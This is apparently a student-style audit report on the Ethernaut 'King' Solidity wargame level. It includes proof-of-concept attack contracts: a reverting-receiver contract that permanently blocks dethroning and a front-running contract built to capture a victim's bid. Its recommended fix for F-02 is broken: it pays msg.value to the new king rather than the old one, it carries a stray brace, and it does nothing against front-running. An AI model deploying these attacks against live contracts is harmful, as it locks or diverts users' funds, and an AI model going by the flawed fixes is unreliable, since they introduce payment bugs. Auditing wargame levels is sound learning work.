# Overview

**Project:** [The Ethernaut - King level]("https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/levels/King.sol")  
**Category:** Smart Contract (Game)  
**Auditor:** Nicolas-Andrei Manasia  
**Date:** 10.10.2025  
**Tools:** Manual Review  
**Scope:**  
	•	King.sol (as provided in the level prompt)  
	•	Compiler: ^0.8.0  
	•	Assumptions: publicly accessible receive(); no allowlist; miners/validators may reorder transactions by fee.  

## 1.Summary

This report documents findings from a manual audit of the King Contract. The goal was to indentify vulnerabilities related to logic, security and gas efficiency.
Total Findings: 3
Severity Breakdown:
- Critical: 1
- High: 1
- Medium: 1 
- Low: 0
- Informational/Gas: 0

## 2.Findings Overview

| ID   | Title                              | Severity      | Description                                                                                      | Recommendation                                                                                  |
|------|------------------------------------|----------------|--------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------|
| F-01 | Forced-refund DoS via reverting recipient | Critical | If an user reverts when the receive() function is called, then the amount wouldn't be evere sent to the person that paid a bigger amount | Implement a pull payment method |
| F-02 | Transaction ordering / frontrunning (MEV) | High | If an attacker sees that someone made a call for a bigger amount, he can place an order with a higher gas that would be a little over the one of the initial king, so that he could receive the amount | Do the effects before the transfer |
| F-03 | Self-raise economic griefing (free lock-in) | Medium | When someone becames king, he can place a higher amount that would go to him back, so he could put a value that nobody would pay| Add a transaction fee |

---
## 3.Detail Findings

### F-01.DOS vulnerability
**Severity:** Critical  
**Category:** DOS

#### Description:
  An DOS attack can be made possible, because an attacker can denied the transfer of the amount.

#### Impact:
  This way any user can't become the king, even if he pays an amount bigger than prize.

### Proof of Concept:
  ```code
  contract KingAttacker {
    constructor(address target) payable {
        (bool ok,) = target.call{value: msg.value}("");
        require(ok, "become king failed");
    }

    receive() external payable {
        revert("I refuse payment");
    }
}
  ```
  
### Recommendation
  Implement a pull payment system. Below is an exemple:
  ```code
  // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingPull {
    address public king;
    uint256 public prize;
    address public owner;

    mapping(address => uint256) public pendingRefunds;

    event NewKing(address indexed newKing, uint256 prize);
    event RefundCredit(address indexed who, uint256 amount);
    event Withdrawn(address indexed who, uint256 amount);

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner, "not enough value");

        // Record refund for current king (pull payment)
        if (king != address(0)) {
            pendingRefunds[king] += prize;
            emit RefundCredit(king, prize);
        }

        // Update state first (CEI)
        king = msg.sender;
        prize = msg.value;

        emit NewKing(king, prize);
    }

    /// @notice Withdraw any pending refunds owed to caller
    function withdraw() external {
        uint256 amount = pendingRefunds[msg.sender];
        require(amount > 0, "no funds");

        // Effects first
        pendingRefunds[msg.sender] = 0;

        // Interaction
        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        require(ok, "withdraw failed");

        emit Withdrawn(msg.sender, amount);
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
  
### F-02
**Severity:** High  
**Category:** MEV / Economic

#### Description:
  An attacker can observe when an order of becoming a king is place, than he would place an order with an higher gas.

#### Impact:
  So the attacker would get a part of the difference and the old king will not get the full amount that he would receive.
  
### Proof of Concept:
  ```code
  // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the interface/contract definition for the King contract
// This allows the attacker contract to interact with it.
interface IKing {
    function prize() external view returns (uint256);
    function _king() external view returns (address);
}

/**
 * @title FrontRunnerAttack
 * @notice This contract performs a front-running attack on the King contract.
 * @dev The goal is to place a minimal bid (Tx A) with high gas just before 
 * a known large victim bid (Tx V) is processed, ensuring Tx A is mined first.
 * The attacker (this contract) becomes the king, and Tx V then pays the attacker.
 */
contract FrontRunnerAttack {
    IKing public immutable target;

    // Address that deployed this contract (for withdrawals)
    address public immutable deployer;

    constructor(address _targetAddress) payable {
        target = IKing(_targetAddress);
        deployer = msg.sender;
    }

    /**
     * @notice The attacker's move (Tx A). Sends a minimal required bid to become the new king.
     * @dev This transaction must be sent with a very high gas premium (priority fee)
     * to ensure it's mined BEFORE the victim's high-value transaction (Tx V).
     */
    function frontRunVictim() public payable {
        // Ensure the amount sent covers the current prize.
        uint256 currentPrize = target.prize();
        require(msg.value > currentPrize, "Attacker bid must be greater than current prize.");
        
        // This makes the call to the King's receive function.
        // The King contract's logic will:
        // 1. Check requirement (passes, as msg.value > prize).
        // 2. Pay the old king (whoever it was) with this msg.value.
        // 3. Set THIS contract (msg.sender) as the new king.
        (bool success, ) = address(target).call{value: msg.value}("");
        require(success, "King contract call failed (Front-run).");
        
        // IMPORTANT: After this call is successful, this Attack contract is the new king.
        // The next transaction to the King contract will pay this contract.
    }

    /**
     * @notice Retrieves the Ether that was paid to this contract by the victim.
     * @dev Should only be called AFTER the victim's high-value transaction has been mined.
     */
    function withdrawProfit() public {
        require(msg.sender == deployer, "Only the deployer can withdraw.");
        
        // The total balance here should equal:
        // (Initial ETH - Attacker Bid Cost) + (Victim's High Bid Payment)
        uint256 balance = address(this).balance;
        payable(deployer).transfer(balance);
    }

    /**
     * @notice Allows the contract to receive ETH back from the King contract (the victim's payment).
     */
    receive() external payable {}
}
  ```
  
### Recommendation:
  Do the effect before the transaction:
  ```code
   // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king = msg.sender;
        prize = msg.value;
        payable(king).transfer(msg.value);
    }

    function _king() public view returns (address) {
        return king;
    }
}
}
```
### F-03.Acces Control vulnerability
**Severity:** Medium  
**Category:** Economic / Game design

#### Description:
  An attacker can remain forever king if after he becames king he would send a bigger sum of money, which could be so big that nobody could be able to pay.

#### Impact:
  In this way they break the rules of the contract
  
#### Recommendation:
  There should be added a fee to transactions and to make it so that if someone is king, he can't send money to the contract.

## 4.Aditional Observations
	•	No reentrancy guards used.
	•	Violates CEI pattern.
	•	Missing events on key state changes.
## 5.Conclusion
  The contract, as written, is vulnerable to (1) a critical DoS via forced refund to a reverting recipient, (2) high-severity MEV frontrunning that can steal victim payments, and (3) a medium-severity self-raise that enables costless economic lock-in. Refactoring to a pull-payment refund scheme, enforcing CEI, and adding basic economic rules (min increments/fees, optional self-dethrone ban) will address these issues and make the game robust.
  
